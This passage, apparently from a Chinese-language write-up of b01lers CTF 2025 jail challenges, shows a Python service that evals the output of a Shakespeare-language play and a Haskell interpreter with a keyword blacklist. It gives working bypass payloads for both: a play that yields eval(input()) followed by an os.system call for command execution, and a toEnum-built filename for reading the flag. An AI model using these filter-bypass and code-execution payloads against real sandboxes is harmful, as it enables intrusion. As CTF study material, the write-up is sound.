</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>shakespearelang.shakespeare</span> <span class=kn>import</span> <span class=n>Shakespeare</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;You&#39;re nothing like a summers day.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;enter your play &gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Heaven&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;King&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Lord&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;angel&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;flower&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;happiness&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;joy&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;plum&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;summer&#39;s&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;day&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hero&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;rose&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;kingdom&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pony&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;animal&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;aunt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;brother&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;cat&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;chihuahua&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;cousin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;cow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;daughter&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;door&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;face&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;father&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;fellow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;granddaughter&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;grandfather&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;grandmother&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;grandson&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hair&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hamster&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;horse&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;lamp&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;lantern&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;mistletoe&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;moon&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;morning&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;mother&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;nephew&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;niece&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;nose&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;purse&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;road&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;roman&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;sister&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;sky&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;son&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;squirrel&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;stone&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;wall&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;thing&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;town&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;tree&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;uncle&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;wind&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Hell&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;Microsoft&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;bastard&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;beggar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;blister&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;codpiece&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;coward&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;curse&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;death&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;devil&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;draught&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;famine&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;flirt-gill&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;goat&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hog&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hound&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;leech&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;lie&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;pig&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;plague&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;starvation&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;toad&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;war&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;wolf&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>blacklist</span> <span class=o>+=</span> <span class=p>[</span><span class=s2>&#34;open&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			  <span class=s2>&#34;listen&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>blacklist</span> <span class=o>+=</span> <span class=p>[</span><span class=s2>&#34;am &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;are &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;art &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;be &#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;is &#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>solution</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>+=</span> <span class=n>line</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=s2>&#34;[exeunt]&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;play received&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>disallowed</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>word</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=ow>in</span> <span class=n>solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;You used an illegal word: </span><span class=si>{</span><span class=n>word</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>disallowed</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>solution</span><span class=o>.</span><span class=n>isascii</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;there were non-ascii characters in your solution.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>disallowed</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=ow>not</span> <span class=n>disallowed</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>old_stdout</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span>
</span></span><span class=line><span class=cl>    <span class=n>old_stdin</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>StringIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>StringIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>        <span class=n>interpreter</span> <span class=o>=</span> <span class=n>Shakespeare</span><span class=p>(</span><span class=n>play</span><span class=o>=</span><span class=n>solution</span><span class=p>,</span> <span class=n>input_style</span><span class=o>=</span><span class=s1>&#39;basic&#39;</span><span class=p>,</span> <span class=n>output_style</span><span class=o>=</span><span class=s1>&#39;basic&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>interpreter</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>getvalue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span> <span class=o>=</span> <span class=n>old_stdout</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>stdin</span> <span class=o>=</span> <span class=n>old_stdin</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>    <span class=nb>eval</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;insults.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>insults</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>random_insult</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>insults</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>random_insult</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>接受剧本，不能有禁用词，然后进行执行</p><p><img src=/p/b01lersctf2025/QQ20250429-122155.jpg width=902 height=492 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>A New Beginning.
</span></span><span class=line><span class=cl>Achilles, meow.
</span></span><span class=line><span class=cl>Andromache, meow.
</span></span><span class=line><span class=cl>Adriana, meow.
</span></span><span class=line><span class=cl>Aegeon, meow.
</span></span><span class=line><span class=cl>Aemilia, meow.
</span></span><span class=line><span class=cl>Agamemnon, meow.
</span></span><span class=line><span class=cl>Agrippa, meow.
</span></span><span class=line><span class=cl>Ajax, meow.
</span></span><span class=line><span class=cl>Alonso, meow.
</span></span><span class=line><span class=cl>Act I: meow.
</span></span><span class=line><span class=cl>Scene I: meow.
</span></span><span class=line><span class=cl>[Enter Achilles and Andromache]
</span></span><span class=line><span class=cl>Achilles: Thou the factorial of Andromache!
</span></span><span class=line><span class=cl>[Exit Andromache]
</span></span><span class=line><span class=cl>[Enter Adriana]
</span></span><span class=line><span class=cl>Achilles: Thou twice Andromache!
</span></span><span class=line><span class=cl>[Exit Adriana]
</span></span><span class=line><span class=cl>[Enter Aegeon]
</span></span><span class=line><span class=cl>Achilles: Thou twice Adriana!
</span></span><span class=line><span class=cl>[Exit Aegeon]
</span></span><span class=line><span class=cl>[Enter Aemilia]
</span></span><span class=line><span class=cl>Achilles: Thou twice Aegeon!
</span></span><span class=line><span class=cl>[Exit Aemilia]
</span></span><span class=line><span class=cl>[Enter Agamemnon]
</span></span><span class=line><span class=cl>Achilles: Thou twice Aemilia!
</span></span><span class=line><span class=cl>[Exit Agamemnon]
</span></span><span class=line><span class=cl>[Enter Agrippa]
</span></span><span class=line><span class=cl>Achilles: Thou twice Agamemnon!
</span></span><span class=line><span class=cl>[Exit Agrippa]
</span></span><span class=line><span class=cl>[Enter Ajax]
</span></span><span class=line><span class=cl>Achilles: Thou twice Agrippa!
</span></span><span class=line><span class=cl>[Exit Ajax]
</span></span><span class=line><span class=cl>[Enter Alonso]
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of Ajax and Agrippa and Aegeon and Andromache! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of Alonso and Agamemnon and Andromache! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of Ajax and Agrippa and Andromache! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of Ajax and Agrippa and Aegeon and Aemilia! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of Agrippa and Aemilia! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of Ajax and Agrippa and Aemilia and Andromache! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of the sum of Ajax and Agrippa and Aegeon and Adriana and Aemilia! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of Ajax and Agrippa and Agamemnon! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of the sum of Ajax and Agrippa and Aegeon and Andromache and Agamemnon! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of the sum of the sum of Ajax and Agrippa and Aegeon and Agamemnon! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of Agrippa and Aemilia! Speak your mind!
</span></span><span class=line><span class=cl>Achilles: Thou the sum of Alonso and Andromache! Speak your mind! Speak your mind!
</span></span><span class=line><span class=cl>[Exit Alonso]
</span></span><span class=line><span class=cl>[exeunt]
</span></span></code></pre></td></tr></table></div></div><p>然后就成功的变出了<code>eval(input())</code>，进行RCE即可<code>__import__('os').system('whoami')</code></p><h2 id=jailjail>jail/&#187;=jail</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-haskell data-lang=haskell><span class=line><span class=cl><span class=kr>import</span> <span class=nn>Language.Haskell.Interpreter</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nn>System.IO</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nn>Data.List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>eval&#39;</span> <span class=ow>::</span> <span class=kt>String</span> <span class=ow>-&gt;</span> <span class=kt>IO</span> <span class=nb>()</span>
</span></span><span class=line><span class=cl><span class=nf>eval&#39;</span> <span class=n>x</span> <span class=ow>=</span> <span class=kr>do</span>
</span></span><span class=line><span class=cl>  <span class=n>ret</span> <span class=ow>&lt;-</span> <span class=n>runInterpreter</span> <span class=o>$</span> <span class=n>setImports</span> <span class=p>[</span><span class=s>&#34;Prelude&#34;</span><span class=p>,</span> <span class=s>&#34;System.IO&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=o>&gt;&gt;</span> <span class=n>runStmt</span> <span class=s>&#34;hSetBuffering stdout NoBuffering&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>&gt;&gt;</span> <span class=n>runStmt</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>  <span class=kr>case</span> <span class=n>ret</span> <span class=kr>of</span>
</span></span><span class=line><span class=cl>    <span class=kt>Right</span> <span class=kr>_</span> <span class=ow>-&gt;</span> <span class=n>return</span> <span class=nb>()</span>
</span></span><span class=line><span class=cl>    <span class=kt>Left</span> <span class=p>(</span><span class=kt>WontCompile</span> <span class=p>((</span><span class=kt>GhcError</span> <span class=n>msg</span><span class=p>)</span><span class=kt>:</span><span class=kr>_</span><span class=p>))</span> <span class=ow>-&gt;</span> <span class=n>putStrLn</span> <span class=n>msg</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>check</span> <span class=ow>::</span> <span class=kt>String</span> <span class=ow>-&gt;</span> <span class=kt>Bool</span>
</span></span><span class=line><span class=cl><span class=nf>check</span> <span class=n>x</span> <span class=ow>=</span> <span class=n>and</span> <span class=o>$</span> <span class=n>map</span> <span class=p>(</span><span class=o>$</span> <span class=n>x</span><span class=p>)</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;readFile&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;flag&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;,&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;(&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;&lt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;+&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;*&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;-&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;&amp;&amp;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;||&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;[&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;]&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;mempty&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;replicate&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;repeat&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;pure&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>not</span> <span class=o>.</span> <span class=n>isInfixOf</span> <span class=s>&#34;return&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>main</span> <span class=ow>=</span> <span class=kr>do</span>
</span></span><span class=line><span class=cl>  <span class=n>putStr</span> <span class=s>&#34;bhci&gt; &#34;</span> <span class=o>&gt;&gt;</span> <span class=n>hFlush</span> <span class=n>stdout</span>
</span></span><span class=line><span class=cl>  <span class=n>inp</span> <span class=ow>&lt;-</span> <span class=n>getLine</span>
</span></span><span class=line><span class=cl>  <span class=kr>if</span> <span class=n>check</span> <span class=n>inp</span> <span class=kr>then</span> <span class=n>eval&#39;</span> <span class=n>inp</span> <span class=kr>else</span> <span class=n>putStrLn</span> <span class=s>&#34;Illegal input.&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>有eval函数把传入字符串当成<code>haskell</code>代码进行执行，但是有黑名单，<code>toEnum</code> 和 <code>show</code>自增来构造出<code>flag.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-haskell data-lang=haskell><span class=line><span class=cl><span class=nf>p</span> <span class=ow>=</span> <span class=n>toEnum</span> <span class=mi>102</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>108</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>97</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>103</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>46</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>116</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>120</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>116</span>
</span></span></code></pre></td></tr></table></div></div><p>但是会被waf掉，我们前面搞个0出来截断就可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-haskell data-lang=haskell><span class=line><span class=cl><span class=kr>let</span> <span class=n>z</span> <span class=ow>=</span> <span class=n>take</span> <span class=mi>0</span> <span class=o>$</span> <span class=n>show</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nf>p</span> <span class=ow>=</span> <span class=n>toEnum</span> <span class=mi>102</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>108</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>97</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>103</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>46</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>116</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>120</span> <span class=kt>:</span> <span class=n>toEnum</span> <span class=mi>116</span> <span class=kt>:</span> <span class=n>z</span>
</span></span></code></pre></td></tr></table></div></div><p>最后再读取文件即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-haskell data-lang=haskell><span class=line><span class=cl><span class=kr>let</span> <span class=n>z</span><span class=ow>=</span><span class=n>take</span> <span class=mi>0</span><span class=o>$</span><span class=n>show</span> <span class=mi>0</span><span class=p>;</span> <span class=n>p</span><span class=ow>=</span><span class=n>toEnum</span> <span class=mi>102</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>108</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>97</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>103</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>46</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>116</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>120</span><span class=kt>:</span><span class=n>toEnum</span> <span class=mi>116</span><span class=kt>:</span><span class=n>z</span><span class=p>;</span><span class=kr>in</span> <span class=n>openFile</span> <span class=n>p</span> <span class=kt>ReadMode</span> <span 